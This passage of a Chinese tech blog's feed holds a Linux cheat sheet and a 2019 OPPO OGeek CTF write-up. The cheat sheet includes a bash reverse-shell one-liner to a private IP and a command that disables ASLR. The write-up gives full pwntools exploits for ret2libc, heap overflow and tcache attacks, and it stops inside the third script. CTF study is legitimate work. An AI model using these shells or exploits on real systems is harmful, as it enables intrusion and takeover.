        <content type="html"><![CDATA[<html><head></head><body><h2 id="Python相关"><a href="#Python相关" class="headerlink" title="Python相关"></a>Python相关</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install 库名     //指定某版本python安装库</span><br><span class="line">python -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple 库名        //指定源进行pip安装</span><br></pre></td></tr></tbody></table></figure></div><h2 id="关闭ASLR"><a href="#关闭ASLR" class="headerlink" title="关闭ASLR"></a>关闭ASLR</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></tbody></table></figure></div><h2 id="弹Shell"><a href="#弹Shell" class="headerlink" title="弹Shell"></a>弹Shell</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i >& /dev/tcp/192.168.174.128/9090 0>&1</span><br></pre></td></tr></tbody></table></figure></div><h2 id="apt-lock"><a href="#apt-lock" class="headerlink" title="apt lock"></a>apt lock</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo rm /var/cache/apt/archives/lock</span><br><span class="line">sudo rm /var/lib/dpkg/lock</span><br></pre></td></tr></tbody></table></figure></div><h2 id="修改bash的颜色"><a href="#修改bash的颜色" class="headerlink" title="修改bash的颜色"></a>修改bash的颜色</h2><h3 id="以下文章摘录于-https-www-cnblogs-com-the-tops-p-5662563-html"><a href="#以下文章摘录于-https-www-cnblogs-com-the-tops-p-5662563-html" class="headerlink" title="以下文章摘录于 https://www.cnblogs.com/the-tops/p/5662563.html"></a>以下文章摘录于 <a href="https://www.cnblogs.com/the-tops/p/5662563.html" target="_blank" rel="noopener">https://www.cnblogs.com/the-tops/p/5662563.html</a></h3><h3 id="【侵删】"><a href="#【侵删】" class="headerlink" title="【侵删】"></a>【侵删】</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">echo -e "\e[31mtest\e[41m"                                                语法</span><br><span class="line"></span><br><span class="line">\e[30m 将字符的显示颜色改为黑色 </span><br><span class="line">\e[31m 将字符的显示颜色改为红色 </span><br><span class="line">\e[32m 将字符的显示颜色改为绿色 </span><br><span class="line">\e[33m 将字符的显示颜色改为淡红色 </span><br><span class="line">\e[34m 将字符的显示颜色改为蓝色 </span><br><span class="line">\e[35m 将字符的显示颜色改为紫色 </span><br><span class="line">\e[36m 将字符的显示颜色改为淡蓝色 </span><br><span class="line">\e[37m 将字符的显示颜色改为灰色 </span><br><span class="line"></span><br><span class="line">\e[40m -- \e[47m 设置背景色 </span><br><span class="line">\e[40m 将背景色设置为黑色 </span><br><span class="line">\e[41m 将背景色设置为红色 </span><br><span class="line">\e[42m 将背景色设置为绿色 </span><br><span class="line">\e[43m 将背景色设置为淡红色 </span><br><span class="line">\e[44m 将背景色设置为蓝色 </span><br><span class="line">\e[45m 将背景色设置为紫色 </span><br><span class="line">\e[46m 将背景色设置为淡蓝色 </span><br><span class="line">\e[47m 将背景色设置为灰色</span><br><span class="line"></span><br><span class="line">设置Linux shell的输出效果［字体颜色，样式等］</span><br><span class="line">echo -e "\033[32;49;1m [DONE] \033[39;49;0m"</span><br><span class="line">输出结果     ：[DONE]</span><br><span class="line"></span><br><span class="line">文本终端的颜色可以使用“ANSI非常规字符序列”来生成。举例：</span><br><span class="line">　　echo -e "\033[44;37;5m ME \033[0m COOL"</span><br><span class="line">以上命令设置背景成为蓝色，前景白色，闪烁光标，输出字符“ME”，然后重新设置屏幕到缺省设置，输出字符 “COOL”。“e”是命令 echo 的一个可选项，它用于激活特殊字符的解析器。“\033”引导非常规字符序列。“m”意味着设置属性然后结束非常规字符序列，这个例子里真正有效的字符是 “44;37;5” 和“0”。</span><br><span class="line"></span><br><span class="line">修改“44;37;5”可以生成不同颜色的组合，数值和编码的前后顺序没有关系。可以选择的编码如下所示：</span><br><span class="line">编码    颜色/动作 </span><br><span class="line">0       重新设置属性到缺省设置 </span><br><span class="line">1       设置粗体 </span><br><span class="line">2       设置一半亮度（模拟彩色显示器的颜色） </span><br><span class="line">4       设置下划线（模拟彩色显示器的颜色） </span><br><span class="line">5       设置闪烁 </span><br><span class="line">7       设置反向图象 </span><br><span class="line">22      设置一般密度 </span><br><span class="line">24      关闭下划线 </span><br><span class="line">25      关闭闪烁 </span><br><span class="line">27      关闭反向图象 </span><br><span class="line">30      设置黑色前景 </span><br><span class="line">31      设置红色前景 </span><br><span class="line">32      设置绿色前景 </span><br><span class="line">33      设置棕色前景 </span><br><span class="line">34      设置蓝色前景 </span><br><span class="line">35      设置紫色前景 </span><br><span class="line">36      设置青色前景 </span><br><span class="line">37      设置白色前景 </span><br><span class="line">38      在缺省的前景颜色上设置下划线 </span><br><span class="line">39      在缺省的前景颜色上关闭下划线 </span><br><span class="line">40      设置黑色背景 </span><br><span class="line">41      设置红色背景 </span><br><span class="line">42      设置绿色背景 </span><br><span class="line">43      设置棕色背景 </span><br><span class="line">44      设置蓝色背景 </span><br><span class="line">45      设置紫色背景 </span><br><span class="line">46      设置青色背景 </span><br><span class="line">47      设置白色背景 </span><br><span class="line">49      设置缺省黑色背景</span><br><span class="line"></span><br><span class="line">其他有趣的代码还有：</span><br><span class="line">\033[2J         　清除屏幕 </span><br><span class="line">\033[0q         　关闭所有的键盘指示灯 </span><br><span class="line">\033[1q         　设置“滚动锁定”指示灯 (Scroll Lock) </span><br><span class="line">\033[2q         　设置“数值锁定”指示灯 (Num Lock) </span><br><span class="line">\033[3q         　设置“大写锁定”指示灯 (Caps Lock) </span><br><span class="line">\033[15:40H     把关闭移动到第15行，40列 </span><br><span class="line">\007            　　发蜂鸣生beep</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> 常识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-19年OPPO_OGeek_线上赛</title>
      <link href="/2019/08/30/CTF-19%E5%B9%B4OPPO_OGeek_%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
      <url>/2019/08/30/CTF-19%E5%B9%B4OPPO_OGeek_%E7%BA%BF%E4%B8%8A%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="PWN1-babyrop"><a href="#PWN1-babyrop" class="headerlink" title="PWN1 babyrop"></a>PWN1 babyrop</h2><h3 id="第一个read发现溢出一位，刚好覆盖返回值，返回值又作为第二个read的size参数，所以我们可以0xff，使得read打到最大，然后elf-plt-puts来libc-leak，然后ret到main（ret到-libc-start-main会崩溃），然后按照老办法覆盖0xff，第二个read溢出直接ret2libc，执行system-“-bin-sh-x00”"><a href="#第一个read发现溢出一位，刚好覆盖返回值，返回值又作为第二个read的size参数，所以我们可以0xff，使得read打到最大，然后elf-plt-puts来libc-leak，然后ret到main（ret到-libc-start-main会崩溃），然后按照老办法覆盖0xff，第二个read溢出直接ret2libc，执行system-“-bin-sh-x00”" class="headerlink" title="第一个read发现溢出一位，刚好覆盖返回值，返回值又作为第二个read的size参数，所以我们可以0xff，使得read打到最大，然后elf.plt.puts来libc leak，然后ret到main（ret到__libc_start_main会崩溃），然后按照老办法覆盖0xff，第二个read溢出直接ret2libc，执行system(“/bin/sh\x00”)"></a>第一个read发现溢出一位，刚好覆盖返回值，返回值又作为第二个read的size参数，所以我们可以0xff，使得read打到最大，然后elf.plt.puts来libc leak，然后ret到main（ret到__libc_start_main会崩溃），然后按照老办法覆盖0xff，第二个read溢出直接ret2libc，执行system(“/bin/sh\x00”)</h3><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp:"></a>Exp:</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("babyrop")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./babyrop")</span><br><span class="line">lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("libc-2.23.so")</span><br><span class="line">sleep(0.2)</span><br><span class="line">#0x080487CF</span><br><span class="line">pop3_ret = 0x080488f9</span><br><span class="line">sh.send('\x00' + "a" * 6 + "\xff"*4 + "\n")</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.recvuntil("Correct\n")</span><br><span class="line">offset = 0xE7 + 4</span><br><span class="line">payload = offset * 'a'</span><br><span class="line">payload += p32(elf.plt['write'])</span><br><span class="line">payload += p32(pop3_ret)</span><br><span class="line">payload += p32(1)</span><br><span class="line">payload += p32(elf.got['__libc_start_main'])</span><br><span class="line">payload += p32(4)</span><br><span class="line">payload += p32(0x08048825)</span><br><span class="line">#0x08048824</span><br><span class="line">sh.send(payload)</span><br><span class="line">__libc_start_main = u32(sh.recv(4))</span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">sleep(0.2)</span><br><span class="line">#0x080487CF</span><br><span class="line">pop3_ret = 0x080488f9</span><br><span class="line">sh.send('\x00' + "a" * 6 + "\xff"*4 + "\n")</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.recvuntil("Correct\n")</span><br><span class="line">offset = 0xE7 + 4</span><br><span class="line">payload = offset * 'a'</span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(0xdeadbeef)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">sh.send(payload)</span><br><span class="line">log.success("__libc_start_main: " + hex(__libc_start_main))</span><br><span class="line">log.success("binsh: " + hex(binsh))</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("47.112.137.238",13337,0)</span><br></pre></td></tr></tbody></table></figure></div><h3 id="Flag-flag-BXCTFKKAZ8-bw-amp-kN"><a href="#Flag-flag-BXCTFKKAZ8-bw-amp-kN" class="headerlink" title="Flag: flag{BXCTFKKAZ8!bw&kN}"></a>Flag: flag{BXCTFKKAZ8!bw&kN}</h3><h2 id="PWN2-bookmanage"><a href="#PWN2-bookmanage" class="headerlink" title="PWN2 bookmanage"></a>PWN2 bookmanage</h2><h3 id="发现edit功能有明显的堆溢出，无论你堆块申请什么都是read-input-chunk-list-0x100-，而且没有末尾置0，所以可以先free一个unsorted-bin，然后连接字符串到libc，然后show就可以看到libc了，然后再edit复原，复原的同时覆盖bk为free-hook-–-0x50，造出一个0x7f的fastbin的size位，然后再申请一个0x68的fastbin，并free掉，通过edit功能修改fd位为0x7f的size的fake-chunk处，即可覆盖free-hook为system，然后同时保证一个堆块是-bin-sh-x00的字符串即可拿到shell"><a href="#发现edit功能有明显的堆溢出，无论你堆块申请什么都是read-input-chunk-list-0x100-，而且没有末尾置0，所以可以先free一个unsorted-bin，然后连接字符串到libc，然后show就可以看到libc了，然后再edit复原，复原的同时覆盖bk为free-hook-–-0x50，造出一个0x7f的fastbin的size位，然后再申请一个0x68的fastbin，并free掉，通过edit功能修改fd位为0x7f的size的fake-chunk处，即可覆盖free-hook为system，然后同时保证一个堆块是-bin-sh-x00的字符串即可拿到shell" class="headerlink" title="发现edit功能有明显的堆溢出，无论你堆块申请什么都是read_input(chunk_list,0x100)，而且没有末尾置0，所以可以先free一个unsorted bin，然后连接字符串到libc，然后show就可以看到libc了，然后再edit复原，复原的同时覆盖bk为free_hook – 0x50，造出一个0x7f的fastbin的size位，然后再申请一个0x68的fastbin，并free掉，通过edit功能修改fd位为0x7f的size的fake_chunk处，即可覆盖free_hook为system，然后同时保证一个堆块是/bin/sh\x00的字符串即可拿到shell"></a>发现edit功能有明显的堆溢出，无论你堆块申请什么都是read_input(chunk_list,0x100)，而且没有末尾置0，所以可以先free一个unsorted bin，然后连接字符串到libc，然后show就可以看到libc了，然后再edit复原，复原的同时覆盖bk为<strong>free_hook – 0x50，造出一个0x7f的fastbin的size位，然后再申请一个0x68的fastbin，并free掉，通过edit功能修改fd位为0x7f的size的fake_chunk处，即可覆盖</strong>free_hook为system，然后同时保证一个堆块是/bin/sh\x00的字符串即可拿到shell</h3><h3 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp:"></a>Exp:</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("bookmanager")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def createName(name):</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(name)</span><br><span class="line">def addChapter(name):</span><br><span class="line">sh.recvuntil("choice:")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(name)</span><br><span class="line">def addSection(name,content):</span><br><span class="line">sh.recvuntil("choice:")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(name)</span><br><span class="line">sh.recvuntil("0x")</span><br><span class="line">data = int(sh.recvuntil("\n",True),16)</span><br><span class="line">sh.send(content)</span><br><span class="line">return data</span><br><span class="line">def addText(s,size,name):</span><br><span class="line">sh.recvuntil("choice:")</span><br><span class="line">sh.sendline("3")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(s)</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(name)</span><br><span class="line">return name</span><br><span class="line">def freeChapter(name):</span><br><span class="line">sh.recvuntil("choice:")</span><br><span class="line">sh.sendline("4")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(name)</span><br><span class="line">def freeSection(name):</span><br><span class="line">sh.recvuntil("choice:")</span><br><span class="line">sh.sendline("5")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(name)</span><br><span class="line">def freeText(name):</span><br><span class="line">sh.recvuntil("choice:")</span><br><span class="line">sh.sendline("6")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(name)</span><br><span class="line">def show():</span><br><span class="line">sh.recvuntil("choice:")</span><br><span class="line">sh.send("7")</span><br><span class="line">def edit(s,name,content):</span><br><span class="line">type_list = ['Chapter','Section','Text']</span><br><span class="line">sh.recvuntil("choice:")</span><br><span class="line">sh.sendline("8")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.sendline(type_list[s])</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(name)</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./bookmanager")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("libc-2.23.so")</span><br><span class="line">createName("fuckyou")</span><br><span class="line">addChapter("\x11" * 0x10)</span><br><span class="line">addSection('\x11' * 0x10,'\x12' * 0x10)</span><br><span class="line">addText("\x12" * 0x10,0x68,'\x13' * 0x18)</span><br><span class="line">addChapter('\x21' * 0x10)</span><br><span class="line">addSection("\x21" * 0x10,'\x22' * 0x10)</span><br><span class="line">addText('\x22' * 0x10,0x18,'\x23' * 0x18)</span><br><span class="line">freeText('\x22' * 0x10)</span><br><span class="line">addText('\x22' * 0x10,0x68,'\x24' * 0x10)</span><br><span class="line">freeChapter('\x21' * 0x10)</span><br><span class="line">freeSection('\x22' * 0x10)</span><br><span class="line">freeText('\x12' * 0x10)</span><br><span class="line">payload = '\x14' * 0x68</span><br><span class="line">payload += '\x14' * 8</span><br><span class="line">addText('\x12' * 0x10,0x68,payload)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(payload)</span><br><span class="line">main_arena = u64(sh.recv(6).ljust(8,'\x00')) - 88</span><br><span class="line">libc = main_arena - 0x10 - lib.symbols['__malloc_hook']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">__free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">payload = '\x14' * 0x68</span><br><span class="line">payload += p64(0x91)</span><br><span class="line">payload += p64(main_arena + 88) + p64(__free_hook - 0x40 - 0x10)</span><br><span class="line">payload += '\x00' * 0x70</span><br><span class="line">payload += p64(0x90)</span><br><span class="line">payload += p64(0x40)</span><br><span class="line">edit(2,'\x12' * 0x10,payload)</span><br><span class="line">addChapter('\x21' * 0x10)</span><br><span class="line">addSection("\x21" * 0x10,'/bin/sh\x00')</span><br><span class="line"></span><br><span class="line">addText("\x12" * 0x10,0x18,'\x25' * 0x10)</span><br><span class="line">payload = '\x25' * 0x18 + p64(0x71) + p64(__free_hook - 0x43) * 2</span><br><span class="line">payload += p64(0) * 10 + p64(0) + p64(0x20cd1)</span><br><span class="line">edit(2,'\x12' * 0x10,payload)</span><br><span class="line">addText("\x12" * 0x10,0x68,'\x16' * 0x68)</span><br><span class="line">payload = '\x00' *3</span><br><span class="line">payload += p64(0) * 6 + p64(system)</span><br><span class="line">addText("\x12" * 0x10,0x68,"\n")</span><br><span class="line">edit(2,'\x12' * 0x10,payload)</span><br><span class="line">freeSection('/bin/sh\x00')</span><br><span class="line">#addText("\x12" * 0x10,0x68,'\x15' * 0x10)</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("main_arena: " + hex(main_arena))</span><br><span class="line">#x/50gx (long long)(&__free_hook) - 0x60</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("47.112.115.30",13337,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="PWN3-hub"><a href="#PWN3-hub" class="headerlink" title="PWN3 hub"></a>PWN3 hub</h2><h3 id="程序逻辑很简单，就是malloc、free、edit8个字节，但是free功能可以堆块任意地址free，先测试一下tcache攻击的poc，因为我不知道远程是否为libc2-27，然后经过测试是2-27的libc。首先申请一个0xa8的堆块把堆地址抬到0x300低位，且将0xa8的堆块double-free后期会用到，然后开始申请申请一个0x80的堆块，然后再申请一个0x8的堆块，然后tcache-attack，覆盖低位地址打回0x80的地址，然后free8次，即可libc-leak。"><a href="#程序逻辑很简单，就是malloc、free、edit8个字节，但是free功能可以堆块任意地址free，先测试一下tcache攻击的poc，因为我不知道远程是否为libc2-27，然后经过测试是2-27的libc。首先申请一个0xa8的堆块把堆地址抬到0x300低位，且将0xa8的堆块double-free后期会用到，然后开始申请申请一个0x80的堆块，然后再申请一个0x8的堆块，然后tcache-attack，覆盖低位地址打回0x80的地址，然后free8次，即可libc-leak。" class="headerlink" title="程序逻辑很简单，就是malloc、free、edit8个字节，但是free功能可以堆块任意地址free，先测试一下tcache攻击的poc，因为我不知道远程是否为libc2.27，然后经过测试是2.27的libc。首先申请一个0xa8的堆块把堆地址抬到0x300低位，且将0xa8的堆块double free后期会用到，然后开始申请申请一个0x80的堆块，然后再申请一个0x8的堆块，然后tcache attack，覆盖低位地址打回0x80的地址，然后free8次，即可libc leak。"></a>程序逻辑很简单，就是malloc、free、edit8个字节，但是free功能可以堆块任意地址free，先测试一下tcache攻击的poc，因为我不知道远程是否为libc2.27，然后经过测试是2.27的libc。首先申请一个0xa8的堆块把堆地址抬到0x300低位，且将0xa8的堆块double free后期会用到，然后开始申请申请一个0x80的堆块，然后再申请一个0x8的堆块，然后tcache attack，覆盖低位地址打回0x80的地址，然后free8次，即可libc leak。</h3><p>然后利用已有堆块上的libc地址，tcache attack攻击<strong>free_hook，注意这里会有一位数字不知道，也就是4个位即16分之一的概率bypass，然后edit为elf.plt.puts，这样在申请一个0x80的堆块再free即可libc leak，这样就知道了system的地址和</strong>free_hook的地址，然后利用一开始的0xa8堆块的double free，tcache attack到__free_hook并覆盖为system，然后申请一个堆块，edit为/bin/sh\x00，然后free，即可执行system(“/bin/sh\x00”)</p><h3 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp:"></a>Exp:</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 